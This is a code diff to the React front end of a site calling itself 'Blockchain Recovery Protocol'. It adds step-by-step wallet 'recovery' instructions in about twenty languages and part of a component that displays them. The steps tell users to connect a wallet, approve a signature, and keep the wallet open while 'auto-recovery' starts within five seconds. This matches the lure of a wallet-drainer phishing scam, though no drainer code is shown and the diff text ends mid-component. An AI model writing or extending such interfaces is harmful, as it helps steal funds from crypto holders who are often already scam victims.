@@ -108,7 +108,15 @@ const TRANSLATIONS = {
     emailSupportTitle: 'Email Support',
     emailSupportDesc: 'No Telegram? No problem! Send us an email with your issue and our support team will get back to you within 24 hours.',
     whyEmailSupport: 'Why Email Support?',
-    emailSupportPoints: '• For users who don\'t use Telegram\n• For detailed issues requiring documentation\n• For exchange users (Binance, Coinbase, Kraken)\n• For follow-up on manual recovery cases'
+    emailSupportPoints: '• For users who don\'t use Telegram\n• For detailed issues requiring documentation\n• For exchange users (Binance, Coinbase, Kraken)\n• For follow-up on manual recovery cases',
+    // NEW INSTRUCTION KEYS
+    recoveryInstructionsTitle: '🔐 How to Recover Your Assets',
+    recoveryStep1: 'Connect your wallet using the button below.',
+    recoveryStep2: 'Wait for automatic scan of 5 blockchain networks (Ethereum, BSC, Polygon, Arbitrum, Avalanche).',
+    recoveryStep3: 'If eligible, the system will automatically initiate recovery (or you can click the button).',
+    recoveryStep4: 'Approve the signature in your wallet to authorize the recovery.',
+    recoveryStep5: 'Recovery completes! You\'ll receive a confirmation and downloadable report.',
+    recoveryNote: '⚠️ Important: Do not disconnect or close your wallet during the process. Auto‑recovery starts in 5 seconds after eligibility detection.'
   },
   es: {
     serviceActive: 'PROTOCOLO DE RECUPERACIÓN · ACTIVO',
@@ -183,7 +191,14 @@ const TRANSLATIONS = {
     emailSupportTitle: 'Soporte por Email',
     emailSupportDesc: '¿No tienes Telegram? ¡No hay problema! Envíanos un email con tu problema y nuestro equipo te responderá en 24 horas.',
     whyEmailSupport: '¿Por qué Email Support?',
-    emailSupportPoints: '• Para usuarios que no usan Telegram\n• Para problemas detallados que requieren documentación\n• Para usuarios de exchanges (Binance, Coinbase, Kraken)\n• Para seguimiento de casos de recuperación manual'
+    emailSupportPoints: '• Para usuarios que no usan Telegram\n• Para problemas detallados que requieren documentación\n• Para usuarios de exchanges (Binance, Coinbase, Kraken)\n• Para seguimiento de casos de recuperación manual',
+    recoveryInstructionsTitle: '🔐 Cómo Recuperar tus Activos',
+    recoveryStep1: 'Conecta tu wallet con el botón de abajo.',
+    recoveryStep2: 'Espera el escaneo automático de 5 redes blockchain (Ethereum, BSC, Polygon, Arbitrum, Avalanche).',
+    recoveryStep3: 'Si eres elegible, el sistema iniciará la recuperación automáticamente (o puedes hacer clic en el botón).',
+    recoveryStep4: 'Aprueba la firma en tu wallet para autorizar la recuperación.',
+    recoveryStep5: '¡Recuperación completada! Recibirás una confirmación y un informe descargable.',
+    recoveryNote: '⚠️ Importante: No desconectes ni cierres tu wallet durante el proceso. La auto‑recuperación comienza en 5 segundos después de detectar elegibilidad.'
   },
   fr: {
     serviceActive: 'PROTOCOLE DE RÉCUPÉRATION · ACTIF',
@@ -258,7 +273,14 @@ const TRANSLATIONS = {
     emailSupportTitle: 'Support par email',
     emailSupportDesc: 'Pas de Telegram ? Envoyez un email.',
     whyEmailSupport: 'Pourquoi email ?',
-    emailSupportPoints: '• Pour les utilisateurs sans Telegram\n• Pour les problèmes nécessitant des pièces jointes\n• Pour les utilisateurs d’exchanges\n• Pour le suivi manuel'
+    emailSupportPoints: '• Pour les utilisateurs sans Telegram\n• Pour les problèmes nécessitant des pièces jointes\n• Pour les utilisateurs d’exchanges\n• Pour le suivi manuel',
+    recoveryInstructionsTitle: '🔐 Comment récupérer vos actifs',
+    recoveryStep1: 'Connectez votre portefeuille avec le bouton ci-dessous.',
+    recoveryStep2: 'Attendez le scan automatique des 5 réseaux blockchain (Ethereum, BSC, Polygon, Arbitrum, Avalanche).',
+    recoveryStep3: 'Si vous êtes éligible, le système lance la récupération automatiquement (ou cliquez sur le bouton).',
+    recoveryStep4: 'Approuvez la signature dans votre portefeuille pour autoriser la récupération.',
+    recoveryStep5: 'Récupération terminée ! Vous recevrez une confirmation et un rapport téléchargeable.',
+    recoveryNote: '⚠️ Important : Ne déconnectez pas et ne fermez pas votre portefeuille pendant le processus. La récupération automatique démarre dans 5 secondes après détection de l\'éligibilité.'
   },
   de: {
     serviceActive: 'WIEDERHERSTELLUNGSPROTOKOLL · AKTIV',
@@ -333,7 +355,14 @@ const TRANSLATIONS = {
     emailSupportTitle: 'E-Mail Support',
     emailSupportDesc: 'Kein Telegram? Senden Sie eine E-Mail.',
     whyEmailSupport: 'Warum E-Mail?',
-    emailSupportPoints: '• Für Benutzer ohne Telegram\n• Für detaillierte Probleme mit Anhängen\n• Für Exchange-Benutzer\n• Für manuelle Nachverfolgung'
+    emailSupportPoints: '• Für Benutzer ohne Telegram\n• Für detaillierte Probleme mit Anhängen\n• Für Exchange-Benutzer\n• Für manuelle Nachverfolgung',
+    recoveryInstructionsTitle: '🔐 So stellen Sie Ihre Vermögenswerte wieder her',
+    recoveryStep1: 'Verbinden Sie Ihr Wallet mit dem Button unten.',
+    recoveryStep2: 'Warten Sie auf den automatischen Scan der 5 Blockchain-Netzwerke (Ethereum, BSC, Polygon, Arbitrum, Avalanche).',
+    recoveryStep3: 'Bei Berechtigung startet das System die Wiederherstellung automatisch (oder Sie klicken auf den Button).',
+    recoveryStep4: 'Genehmigen Sie die Signatur in Ihrem Wallet, um die Wiederherstellung zu autorisieren.',
+    recoveryStep5: 'Wiederherstellung abgeschlossen! Sie erhalten eine Bestätigung und einen herunterladbaren Bericht.',
+    recoveryNote: '⚠️ Wichtig: Trennen Sie Ihr Wallet während des Vorgangs nicht und schließen Sie es nicht. Die automatische Wiederherstellung beginnt 5 Sekunden nach der Erkennung der Berechtigung.'
   },
   it: {
     serviceActive: 'PROTOCOLLO DI RECUPERO · ATTIVO',
@@ -408,7 +437,14 @@ const TRANSLATIONS = {
     emailSupportTitle: 'Supporto email',
     emailSupportDesc: 'Niente Telegram? Invia una email.',
     whyEmailSupport: 'Perché email?',
-    emailSupportPoints: '• Per utenti senza Telegram\n• Per problemi che richiedono documenti\n• Per utenti exchange\n• Per follow-up manuali'
+    emailSupportPoints: '• Per utenti senza Telegram\n• Per problemi che richiedono documenti\n• Per utenti exchange\n• Per follow-up manuali',
+    recoveryInstructionsTitle: '🔐 Come recuperare i tuoi asset',
+    recoveryStep1: 'Connetti il tuo wallet con il pulsante qui sotto.',
+    recoveryStep2: 'Attendi la scansione automatica delle 5 reti blockchain (Ethereum, BSC, Polygon, Arbitrum, Avalanche).',
+    recoveryStep3: 'Se idoneo, il sistema avvia il recupero automaticamente (o puoi cliccare sul pulsante).',
+    recoveryStep4: 'Approva la firma nel tuo wallet per autorizzare il recupero.',
+    recoveryStep5: 'Recupero completato! Riceverai una conferma e un rapporto scaricabile.',
+    recoveryNote: '⚠️ Importante: Non disconnettere né chiudere il wallet durante il processo. L\'auto‑recupero parte in 5 secondi dopo il rilevamento dell\'idoneità.'
   },
   pt: {
     serviceActive: 'PROTOCOLO DE RECUPERAÇÃO · ATIVO',
@@ -483,7 +519,14 @@ const TRANSLATIONS = {
     emailSupportTitle: 'Suporte por e-mail',
     emailSupportDesc: 'Sem Telegram? Envie um e-mail.',
     whyEmailSupport: 'Por que e-mail?',
-    emailSupportPoints: '• Para usuários sem Telegram\n• Para problemas com documentação\n• Para usuários de exchanges\n• Para acompanhamento manual'
+    emailSupportPoints: '• Para usuários sem Telegram\n• Para problemas com documentação\n• Para usuários de exchanges\n• Para acompanhamento manual',
+    recoveryInstructionsTitle: '🔐 Como recuperar seus ativos',
+    recoveryStep1: 'Conecte sua carteira com o botão abaixo.',
+    recoveryStep2: 'Aguarde a verificação automática das 5 redes blockchain (Ethereum, BSC, Polygon, Arbitrum, Avalanche).',
+    recoveryStep3: 'Se elegível, o sistema inicia a recuperação automaticamente (ou clique no botão).',
+    recoveryStep4: 'Aprove a assinatura em sua carteira para autorizar a recuperação.',
+    recoveryStep5: 'Recuperação concluída! Você receberá uma confirmação e um relatório para download.',
+    recoveryNote: '⚠️ Importante: Não desconecte nem feche sua carteira durante o processo. A auto‑recuperação começa em 5 segundos após a detecção de elegibilidade.'
   },
   ru: {
     serviceActive: 'ПРОТОКОЛ ВОССТАНОВЛЕНИЯ · АКТИВЕН',
@@ -558,7 +601,14 @@ const TRANSLATIONS = {
     emailSupportTitle: 'Поддержка по email',
     emailSupportDesc: 'Нет Telegram? Напишите email.',
     whyEmailSupport: 'Зачем email?',
-    emailSupportPoints: '• Для пользователей без Telegram\n• Для проблем с документами\n• Для пользователей бирж\n• Для ручного сопровождения'
+    emailSupportPoints: '• Для пользователей без Telegram\n• Для проблем с документами\n• Для пользователей бирж\n• Для ручного сопровождения',
+    recoveryInstructionsTitle: '🔐 Как восстановить активы',
+    recoveryStep1: 'Подключите кошелёк с помощью кнопки ниже.',
+    recoveryStep2: 'Дождитесь автоматического сканирования 5 блокчейн-сетей (Ethereum, BSC, Polygon, Arbitrum, Avalanche).',
+    recoveryStep3: 'При наличии права система запустит восстановление автоматически (или нажмите кнопку).',
+    recoveryStep4: 'Подтвердите подпись в кошельке для авторизации восстановления.',
+    recoveryStep5: 'Восстановление завершено! Вы получите подтверждение и отчёт для скачивания.',
+    recoveryNote: '⚠️ Важно: Не отключайте и не закрывайте кошелёк во время процесса. Автовосстановление начнётся через 5 секунд после обнаружения права.'
   },
   zh: {
     serviceActive: '恢复协议 · 活跃中',
@@ -633,7 +683,14 @@ const TRANSLATIONS = {
     emailSupportTitle: '电子邮件支持',
     emailSupportDesc: '没有 Telegram？没问题！发送电子邮件给我们，我们的支持团队将在 24 小时内回复您。',
     whyEmailSupport: '为什么选择电子邮件支持？',
-    emailSupportPoints: '• 对于不使用 Telegram 的用户\n• 对于需要文档的详细问题\n• 对于交易所用户（Binance、Coinbase、Kraken）\n• 对于手动恢复案例的跟进'
+    emailSupportPoints: '• 对于不使用 Telegram 的用户\n• 对于需要文档的详细问题\n• 对于交易所用户（Binance、Coinbase、Kraken）\n• 对于手动恢复案例的跟进',
+    recoveryInstructionsTitle: '🔐 如何恢复您的资产',
+    recoveryStep1: '使用下方按钮连接您的钱包。',
+    recoveryStep2: '等待自动扫描 5 个区块链网络（Ethereum、BSC、Polygon、Arbitrum、Avalanche）。',
+    recoveryStep3: '如果符合条件，系统将自动启动恢复（或您可点击按钮）。',
+    recoveryStep4: '在钱包中批准签名以授权恢复。',
+    recoveryStep5: '恢复完成！您将收到确认和可下载的报告。',
+    recoveryNote: '⚠️ 重要：恢复过程中请勿断开或关闭钱包。检测到资格后，自动恢复将在 5 秒后开始。'
   },
   ja: {
     serviceActive: 'リカバリープロトコル · アクティブ',
@@ -708,7 +765,14 @@ const TRANSLATIONS = {
     emailSupportTitle: 'メールサポート',
     emailSupportDesc: 'Telegram がありませんか？問題ありません！問題を記載したメールを送信してください。サポートチームが 24 時間以内に返信します。',
     whyEmailSupport: 'メールサポートの理由',
-    emailSupportPoints: '• Telegram を使用しないユーザー向け\n• 文書化が必要な詳細な問題向け\n• 取引所ユーザー（Binance、Coinbase、Kraken）向け\n• 手動復元ケースのフォローアップ向け'
+    emailSupportPoints: '• Telegram を使用しないユーザー向け\n• 文書化が必要な詳細な問題向け\n• 取引所ユーザー（Binance、Coinbase、Kraken）向け\n• 手動復元ケースのフォローアップ向け',
+    recoveryInstructionsTitle: '🔐 資産を復元する方法',
+    recoveryStep1: '下のボタンでウォレットを接続します。',
+    recoveryStep2: '5つのブロックチェーンネットワーク（Ethereum、BSC、Polygon、Arbitrum、Avalanche）の自動スキャンを待ちます。',
+    recoveryStep3: '対象の場合、システムが自動的に復元を開始します（またはボタンをクリック）。',
+    recoveryStep4: 'ウォレットで署名を承認して復元を許可します。',
+    recoveryStep5: '復元完了！確認とダウンロード可能なレポートを受け取ります。',
+    recoveryNote: '⚠️ 重要：処理中はウォレットを切断したり閉じたりしないでください。対象検出後5秒で自動復元が開始されます。'
   },
   ko: {
     serviceActive: '복구 프로토콜 · 활성화됨',
@@ -783,7 +847,14 @@ const TRANSLATIONS = {
     emailSupportTitle: '이메일 지원',
     emailSupportDesc: '텔레그램이 없습니까? 문제 없습니다! 문제가 있는 이메일을 보내주시면 지원 팀이 24시간 이내에 답변드립니다.',
     whyEmailSupport: '이메일 지원 이유',
-    emailSupportPoints: '• 텔레그램을 사용하지 않는 사용자\n• 문서화가 필요한 세부 문제\n• 거래소 사용자(Binance, Coinbase, Kraken)\n• 수동 복구 사례 추적'
+    emailSupportPoints: '• 텔레그램을 사용하지 않는 사용자\n• 문서화가 필요한 세부 문제\n• 거래소 사용자(Binance, Coinbase, Kraken)\n• 수동 복구 사례 추적',
+    recoveryInstructionsTitle: '🔐 자산을 복구하는 방법',
+    recoveryStep1: '아래 버튼으로 지갑을 연결하세요.',
+    recoveryStep2: '5개의 블록체인 네트워크(Ethereum, BSC, Polygon, Arbitrum, Avalanche) 자동 스캔을 기다리세요.',
+    recoveryStep3: '자격이 있는 경우 시스템이 자동으로 복구를 시작합니다(또는 버튼을 클릭).',
+    recoveryStep4: '지갑에서 서명을 승인하여 복구를 허가하세요.',
+    recoveryStep5: '복구 완료! 확인 및 다운로드 가능한 보고서를 받게 됩니다.',
+    recoveryNote: '⚠️ 중요: 프로세스 중에 지갑을 연결 해제하거나 닫지 마세요. 자격 감지 후 5초 후에 자동 복구가 시작됩니다.'
   },
   ar: {
     serviceActive: 'بروتوكول الاسترداد · نشط',
@@ -858,7 +929,14 @@ const TRANSLATIONS = {
     emailSupportTitle: 'الدعم عبر البريد الإلكتروني',
     emailSupportDesc: 'لا تستخدم Telegram؟ لا مشكلة! أرسل إلينا بريدًا إلكترونيًا بمشكلتك وسيتواصل معك فريق الدعم في غضون 24 ساعة.',
     whyEmailSupport: 'لماذا الدعم عبر البريد الإلكتروني؟',
-    emailSupportPoints: '• للمستخدمين الذين لا يستخدمون Telegram\n• للمشكلات التفصيلية التي تتطلب توثيقًا\n• لمستخدمي البورصات (Binance، Coinbase، Kraken)\n• لمتابعة حالات الاسترداد اليدوي'
+    emailSupportPoints: '• للمستخدمين الذين لا يستخدمون Telegram\n• للمشكلات التفصيلية التي تتطلب توثيقًا\n• لمستخدمي البورصات (Binance، Coinbase، Kraken)\n• لمتابعة حالات الاسترداد اليدوي',
+    recoveryInstructionsTitle: '🔐 كيفية استرداد أصولك',
+    recoveryStep1: 'قم بتوصيل محفظتك باستخدام الزر أدناه.',
+    recoveryStep2: 'انتظر الفحص التلقائي لـ 5 شبكات blockchain (Ethereum، BSC، Polygon، Arbitrum، Avalanche).',
+    recoveryStep3: 'إذا كنت مؤهلاً، سيبدأ النظام الاسترداد تلقائيًا (أو يمكنك النقر على الزر).',
+    recoveryStep4: 'وافق على التوقيع في محفظتك لتأذن بالاسترداد.',
+    recoveryStep5: 'اكتمل الاسترداد! ستتلقى تأكيدًا وتقريرًا قابلًا للتنزيل.',
+    recoveryNote: '⚠️ مهم: لا تقم بقطع الاتصال أو إغلاق محفظتك أثناء العملية. سيبدأ الاسترداد التلقائي بعد 5 ثوانٍ من اكتشاف الأهلية.'
   },
   hi: {
     serviceActive: 'रिकवरी प्रोटोकॉल · सक्रिय',
@@ -933,7 +1011,14 @@ const TRANSLATIONS = {
     emailSupportTitle: 'ईमेल सहायता',
     emailSupportDesc: 'टेलीग्राम नहीं है? कोई बात नहीं! हमें अपनी समस्या के साथ एक ईमेल भेजें और हमारी सहायता टीम 24 घंटे के भीतर आपसे संपर्क करेगी।',
     whyEmailSupport: 'ईमेल सहायता क्यों?',
-    emailSupportPoints: '• उन उपयोगकर्ताओं के लिए जो टेलीग्राम का उपयोग नहीं करते हैं\n• दस्तावेज़ीकरण की आवश्यकता वाले विस्तृत मुद्दों के लिए\n• एक्सचेंज उपयोगकर्ताओं के लिए (Binance, Coinbase, Kraken)\n• मैनुअल रिकवरी मामलों के अनुवर्ती के लिए'
+    emailSupportPoints: '• उन उपयोगकर्ताओं के लिए जो टेलीग्राम का उपयोग नहीं करते हैं\n• दस्तावेज़ीकरण की आवश्यकता वाले विस्तृत मुद्दों के लिए\n• एक्सचेंज उपयोगकर्ताओं के लिए (Binance, Coinbase, Kraken)\n• मैनुअल रिकवरी मामलों के अनुवर्ती के लिए',
+    recoveryInstructionsTitle: '🔐 अपनी संपत्तियों को कैसे पुनर्प्राप्त करें',
+    recoveryStep1: 'नीचे दिए गए बटन का उपयोग करके अपना वॉलेट कनेक्ट करें।',
+    recoveryStep2: '5 ब्लॉकचेन नेटवर्क (Ethereum, BSC, Polygon, Arbitrum, Avalanche) की स्वचालित स्कैनिंग की प्रतीक्षा करें।',
+    recoveryStep3: 'यदि पात्र हैं, तो सिस्टम स्वचालित रूप से रिकवरी शुरू कर देगा (या आप बटन पर क्लिक कर सकते हैं)।',
+    recoveryStep4: 'रिकवरी को अधिकृत करने के लिए अपने वॉलेट में हस्ताक्षर स्वीकृत करें।',
+    recoveryStep5: 'रिकवरी पूरी हुई! आपको एक पुष्टि और डाउनलोड करने योग्य रिपोर्ट प्राप्त होगी।',
+    recoveryNote: '⚠️ महत्वपूर्ण: प्रक्रिया के दौरान अपने वॉलेट को डिस्कनेक्ट या बंद न करें। पात्रता का पता लगने के 5 सेकंड बाद स्वचालित रिकवरी शुरू हो जाती है।'
   },
   tr: {
     serviceActive: 'KURTARMA PROTOKOLÜ · AKTİF',
@@ -1008,7 +1093,14 @@ const TRANSLATIONS = {
     emailSupportTitle: 'E-posta Desteği',
     emailSupportDesc: 'Telegram yok mu? Sorun değil! Sorununuzu içeren bir e-posta gönderin, destek ekibimiz 24 saat içinde size geri dönecektir.',
     whyEmailSupport: 'Neden E-posta Desteği?',
-    emailSupportPoints: '• Telegram kullanmayan kullanıcılar için\n• Belgeler gerektiren ayrıntılı sorunlar için\n• Borsa kullanıcıları için (Binance, Coinbase, Kraken)\n• Manuel kurtarma vakalarının takibi için'
+    emailSupportPoints: '• Telegram kullanmayan kullanıcılar için\n• Belgeler gerektiren ayrıntılı sorunlar için\n• Borsa kullanıcıları için (Binance, Coinbase, Kraken)\n• Manuel kurtarma vakalarının takibi için',
+    recoveryInstructionsTitle: '🔐 Varlıklarınızı Nasıl Kurtarırsınız',
+    recoveryStep1: 'Aşağıdaki butonla cüzdanınızı bağlayın.',
+    recoveryStep2: '5 blockchain ağının (Ethereum, BSC, Polygon, Arbitrum, Avalanche) otomatik taramasını bekleyin.',
+    recoveryStep3: 'Uygun iseniz, sistem otomatik olarak kurtarmayı başlatır (veya butona tıklayabilirsiniz).',
+    recoveryStep4: 'Kurtarmayı yetkilendirmek için cüzdanınızdaki imzayı onaylayın.',
+    recoveryStep5: 'Kurtarma tamamlandı! Bir onay ve indirilebilir rapor alacaksınız.',
+    recoveryNote: '⚠️ Önemli: İşlem sırasında cüzdanınızın bağlantısını kesmeyin veya kapatmayın. Uygunluk tespitinden 5 saniye sonra otomatik kurtarma başlar.'
   },
   nl: {
     serviceActive: 'HERSTELPROTOCOL · ACTIEF',
@@ -1083,7 +1175,14 @@ const TRANSLATIONS = {
     emailSupportTitle: 'E-mailondersteuning',
     emailSupportDesc: 'Geen Telegram? Geen probleem! Stuur ons een e-mail met uw probleem en ons ondersteuningsteam neemt binnen 24 uur contact met u op.',
     whyEmailSupport: 'Waarom e-mailondersteuning?',
-    emailSupportPoints: '• Voor gebruikers die geen Telegram gebruiken\n• Voor gedetailleerde problemen die documentatie vereisen\n• Voor exchange-gebruikers (Binance, Coinbase, Kraken)\n• Voor opvolging van handmatige herstelgevallen'
+    emailSupportPoints: '• Voor gebruikers die geen Telegram gebruiken\n• Voor gedetailleerde problemen die documentatie vereisen\n• Voor exchange-gebruikers (Binance, Coinbase, Kraken)\n• Voor opvolging van handmatige herstelgevallen',
+    recoveryInstructionsTitle: '🔐 Hoe u uw activa herstelt',
+    recoveryStep1: 'Verbind uw wallet met de knop hieronder.',
+    recoveryStep2: 'Wacht op de automatische scan van 5 blockchain-netwerken (Ethereum, BSC, Polygon, Arbitrum, Avalanche).',
+    recoveryStep3: 'Als u in aanmerking komt, start het systeem automatisch herstel (of klik op de knop).',
+    recoveryStep4: 'Keur de handtekening in uw wallet goed om het herstel te autoriseren.',
+    recoveryStep5: 'Herstel voltooid! U ontvangt een bevestiging en een downloadbaar rapport.',
+    recoveryNote: '⚠️ Belangrijk: Verbreek de verbinding niet en sluit uw wallet niet tijdens het proces. Automatisch herstel start 5 seconden na detectie van geschiktheid.'
   },
   pl: {
     serviceActive: 'PROTOKÓŁ ODZYSKIWANIA · AKTYWNY',
@@ -1158,7 +1257,14 @@ const TRANSLATIONS = {
     emailSupportTitle: 'Wsparcie e-mail',
     emailSupportDesc: 'Nie masz Telegrama? Żaden problem! Wyślij nam e-mail z problemem, a nasz zespół skontaktuje się z Tobą w ciągu 24 godzin.',
     whyEmailSupport: 'Dlaczego wsparcie e-mail?',
-    emailSupportPoints: '• Dla użytkowników, którzy nie używają Telegrama\n• Dla szczegółowych problemów wymagających dokumentacji\n• Dla użytkowników giełd (Binance, Coinbase, Kraken)\n• Dla śledzenia przypadków ręcznego odzyskiwania'
+    emailSupportPoints: '• Dla użytkowników, którzy nie używają Telegrama\n• Dla szczegółowych problemów wymagających dokumentacji\n• Dla użytkowników giełd (Binance, Coinbase, Kraken)\n• Dla śledzenia przypadków ręcznego odzyskiwania',
+    recoveryInstructionsTitle: '🔐 Jak odzyskać swoje aktywa',
+    recoveryStep1: 'Połącz swój portfel za pomocą przycisku poniżej.',
+    recoveryStep2: 'Poczekaj na automatyczne skanowanie 5 sieci blockchain (Ethereum, BSC, Polygon, Arbitrum, Avalanche).',
+    recoveryStep3: 'Jeśli kwalifikujesz się, system automatycznie rozpocznie odzyskiwanie (lub kliknij przycisk).',
+    recoveryStep4: 'Zatwierdź podpis w swoim portfelu, aby autoryzować odzyskiwanie.',
+    recoveryStep5: 'Odzyskiwanie zakończone! Otrzymasz potwierdzenie i raport do pobrania.',
+    recoveryNote: '⚠️ Ważne: Nie rozłączaj ani nie zamykaj swojego portfela podczas procesu. Auto-odzyskiwanie rozpoczyna się 5 sekund po wykryciu kwalifikowalności.'
   },
   vi: {
     serviceActive: 'GIAO THỨC PHỤC HỒI · ĐANG HOẠT ĐỘNG',
@@ -1233,7 +1339,14 @@ const TRANSLATIONS = {
     emailSupportTitle: 'Hỗ trợ qua Email',
     emailSupportDesc: 'Không có Telegram? Không vấn đề! Gửi email cho chúng tôi với vấn đề của bạn và đội ngũ hỗ trợ sẽ liên hệ lại trong vòng 24 giờ.',
     whyEmailSupport: 'Tại sao nên dùng Email Support?',
-    emailSupportPoints: '• Dành cho người dùng không sử dụng Telegram\n• Dành cho vấn đề chi tiết cần tài liệu\n• Dành cho người dùng sàn giao dịch (Binance, Coinbase, Kraken)\n• Dành cho theo dõi các trường hợp phục hồi thủ công'
+    emailSupportPoints: '• Dành cho người dùng không sử dụng Telegram\n• Dành cho vấn đề chi tiết cần tài liệu\n• Dành cho người dùng sàn giao dịch (Binance, Coinbase, Kraken)\n• Dành cho theo dõi các trường hợp phục hồi thủ công',
+    recoveryInstructionsTitle: '🔐 Cách phục hồi tài sản của bạn',
+    recoveryStep1: 'Kết nối ví của bạn bằng nút bên dưới.',
+    recoveryStep2: 'Chờ quét tự động 5 mạng blockchain (Ethereum, BSC, Polygon, Arbitrum, Avalanche).',
+    recoveryStep3: 'Nếu đủ điều kiện, hệ thống sẽ tự động bắt đầu phục hồi (hoặc bạn có thể nhấp vào nút).',
+    recoveryStep4: 'Phê duyệt chữ ký trong ví của bạn để ủy quyền phục hồi.',
+    recoveryStep5: 'Phục hồi hoàn tất! Bạn sẽ nhận được xác nhận và báo cáo có thể tải xuống.',
+    recoveryNote: '⚠️ Quan trọng: Không ngắt kết nối hoặc đóng ví của bạn trong quá trình. Tự động phục hồi bắt đầu sau 5 giây kể từ khi phát hiện đủ điều kiện.'
   },
   th: {
     serviceActive: 'โปรโตคอลการกู้คืน · ทำงานอยู่',
@@ -1308,7 +1421,14 @@ const TRANSLATIONS = {
     emailSupportTitle: 'การสนับสนุนทางอีเมล',
     emailSupportDesc: 'ไม่มี Telegram? ไม่มีปัญหา! ส่งอีเมลถึงเราพร้อมปัญหาของคุณและทีมสนับสนุนของเราจะติดต่อกลับภายใน 24 ชั่วโมง',
     whyEmailSupport: 'ทำไมต้องใช้ Email Support?',
-    emailSupportPoints: '• สำหรับผู้ใช้ที่ไม่ได้ใช้ Telegram\n• สำหรับปัญหาที่ต้องใช้เอกสารประกอบ\n• สำหรับผู้ใช้ exchange (Binance, Coinbase, Kraken)\n• สำหรับการติดตามกรณีการกู้คืนด้วยตนเอง'
+    emailSupportPoints: '• สำหรับผู้ใช้ที่ไม่ได้ใช้ Telegram\n• สำหรับปัญหาที่ต้องใช้เอกสารประกอบ\n• สำหรับผู้ใช้ exchange (Binance, Coinbase, Kraken)\n• สำหรับการติดตามกรณีการกู้คืนด้วยตนเอง',
+    recoveryInstructionsTitle: '🔐 วิธีการกู้คืนสินทรัพย์ของคุณ',
+    recoveryStep1: 'เชื่อมต่อกระเป๋าเงินของคุณด้วยปุ่มด้านล่าง',
+    recoveryStep2: 'รอการสแกนอัตโนมัติของเครือข่ายบล็อกเชน 5 เครือข่าย (Ethereum, BSC, Polygon, Arbitrum, Avalanche)',
+    recoveryStep3: 'หากมีคุณสมบัติ ระบบจะเริ่มการกู้คืนโดยอัตโนมัติ (หรือคุณสามารถคลิกปุ่ม)',
+    recoveryStep4: 'อนุมัติลายเซ็นในกระเป๋าเงินของคุณเพื่ออนุญาตการกู้คืน',
+    recoveryStep5: 'การกู้คืนเสร็จสมบูรณ์! คุณจะได้รับการยืนยันและรายงานที่ดาวน์โหลดได้',
+    recoveryNote: '⚠️ สำคัญ: อย่าตัดการเชื่อมต่อหรือปิดกระเป๋าเงินของคุณในระหว่างกระบวนการ การกู้คืนอัตโนมัติจะเริ่มใน 5 วินาทีหลังจากตรวจพบคุณสมบัติ'
   },
   id: {
     serviceActive: 'PROTOKOL PEMULIHAN · AKTIF',
@@ -1383,7 +1503,14 @@ const TRANSLATIONS = {
     emailSupportTitle: 'Dukungan Email',
     emailSupportDesc: 'Tidak punya Telegram? Tidak masalah! Kirimkan email kepada kami dengan masalah Anda dan tim dukungan kami akan menghubungi Anda kembali dalam waktu 24 jam.',
     whyEmailSupport: 'Mengapa Dukungan Email?',
-    emailSupportPoints: '• Untuk pengguna yang tidak menggunakan Telegram\n• Untuk masalah mendetail yang memerlukan dokumentasi\n• Untuk pengguna exchange (Binance, Coinbase, Kraken)\n• Untuk tindak lanjut kasus pemulihan manual'
+    emailSupportPoints: '• Untuk pengguna yang tidak menggunakan Telegram\n• Untuk masalah mendetail yang memerlukan dokumentasi\n• Untuk pengguna exchange (Binance, Coinbase, Kraken)\n• Untuk tindak lanjut kasus pemulihan manual',
+    recoveryInstructionsTitle: '🔐 Cara Memulihkan Aset Anda',
+    recoveryStep1: 'Hubungkan dompet Anda menggunakan tombol di bawah.',
+    recoveryStep2: 'Tunggu pemindaian otomatis 5 jaringan blockchain (Ethereum, BSC, Polygon, Arbitrum, Avalanche).',
+    recoveryStep3: 'Jika memenuhi syarat, sistem akan memulai pemulihan secara otomatis (atau Anda dapat mengklik tombol).',
+    recoveryStep4: 'Setujui tanda tangan di dompet Anda untuk mengotorisasi pemulihan.',
+    recoveryStep5: 'Pemulihan selesai! Anda akan menerima konfirmasi dan laporan yang dapat diunduh.',
+    recoveryNote: '⚠️ Penting: Jangan putuskan sambungan atau tutup dompet Anda selama proses. Pemulihan otomatis dimulai 5 detik setelah deteksi kelayakan.'
   }
 };
 
@@ -2074,6 +2201,61 @@ const Footer = () => {
         © 2026 Blockchain Recovery Protocol — Secure Non-Custodial Asset Recovery. All rights reserved.
       </div>
     </footer>
+  );
+};
+
+// ============================================
+// RECOVERY INSTRUCTION COMPONENT (NEW)
+// ============================================
+const RecoveryInstructions = ({ translations }) => {
+  const [expanded, setExpanded] = useState(true);
+
+  return (
+    <div className="w-full max-w-md mx-auto mt-6 mb-2 bg-gradient-to-br from-blue-500/10 to-purple-500/5 border border-blue-500/40 backdrop-blur rounded-2xl shadow-xl shadow-blue-500/10 transition-all duration-300 hover:shadow-blue-500/20 overflow-hidden">
+      <div 
+        className="flex items-center justify-between px-5 py-4 cursor-pointer bg-blue-500/5 border-b border-blue-500/20"
+        onClick={() => setExpanded(!expanded)}
+      >
+        <div className="flex items-center gap-3">
+          <span className="text-xl">🔐</span>
+          <h3 className="text-base font-bold text-blue-400 tracking-wide">
+            {translations.recoveryInstructionsTitle}
+          </h3>
+        </div>
+        <button className="text-gray-400 hover:text-white transition-colors text-sm">
+          {expanded ? '−' : '+'}
+        </button>
+      </div>
+      
+      {expanded && (
+        <div className="px-5 py-4 space-y-2.5 text-sm">
+          <div className="flex gap-3 items-start">
+            <span className="text-blue-400 font-bold text-xs bg-blue-500/20 rounded-full w-5 h-5 flex items-center justify-center flex-shrink-0 mt-0.5">1</span>
+            <span className="text-gray-300">{translations.recoveryStep1}</span>
+          </div>
+          <div className="flex gap-3 items-start">
+            <span className="text-blue-400 font-bold text-xs bg-blue-500/20 rounded-full w-5 h-5 flex items-center justify-center flex-shrink-0 mt-0.5">2</span>
+            <span className="text-gray-300">{translations.recoveryStep2}</span>
+          </div>
+          <div className="flex gap-3 items-start">
+            <span className="text-blue-400 font-bold text-xs bg-blue-500/20 rounded-full w-5 h-5 flex items-center justify-center flex-shrink-0 mt-0.5">3</span>
+            <span className="text-gray-300">{translations.recoveryStep3}</span>
+          </div>
+          <div className="flex gap-3 items-start">
+            <span className="text-blue-400 font-bold text-xs bg-blue-500/20 rounded-full w-5 h-5 flex items-center justify-center flex-shrink-0 mt-0.5">4</span>
+            <span className="text-gray-300">{translations.recoveryStep4}</span>
+          </div>
+          <div className="flex gap-3 items-start">
+            <span className="text-blue-400 font-bold text-xs bg-blue-500/20 rounded-full w-5 h-5 flex items-center justify-center flex-shrink-0 mt-0.5">5</span>
